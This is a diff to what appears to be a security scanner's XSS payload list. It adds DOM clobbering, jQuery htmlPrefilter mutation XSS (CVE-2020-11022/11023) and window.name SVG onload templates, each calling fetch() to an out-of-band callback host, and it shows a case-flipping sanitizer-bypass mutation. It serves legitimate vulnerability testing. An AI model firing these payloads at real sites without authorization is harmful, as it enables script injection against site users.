@@ -26,6 +26,18 @@ payloads:
     template: "javascript:fetch('//{oast_host}/{canary}')"
     confidence: suspected
     notes: "javascript: URI sink; executes when a source flows into href or eval."
+  - id: dom_clobber_anchor
+    template: "<a id=\"config\" href=\"//{oast_host}/{canary}\">"
+    confidence: suspected
+    notes: DOM Clobbering probe; markup-only (no script) overwrite of a JS global later used as a URL/sink, confirmed via OAST callback.
+  - id: jquery_style_selfclose
+    template: "<style><style/><img src=x onerror=fetch('//{oast_host}/{canary}')>"
+    confidence: suspected
+    notes: jQuery <3.5.0 htmlPrefilter self-closing-tag mutation XSS (CVE-2020-11022/CVE-2020-11023).
+  - id: window_name_sink
+    template: "<svg onload=fetch('//{oast_host}/{canary}?src=wname')>"
+    confidence: suspected
+    notes: window.name-sourced DOM XSS; payload delivered via cross-page window.name assignment before navigation, fires when the app reads window.name into a markup sink.
 mutations:
   - name: case_flip
     description: Flip case of tag/handler names to bypass case-sensitive DOM sanitizers.
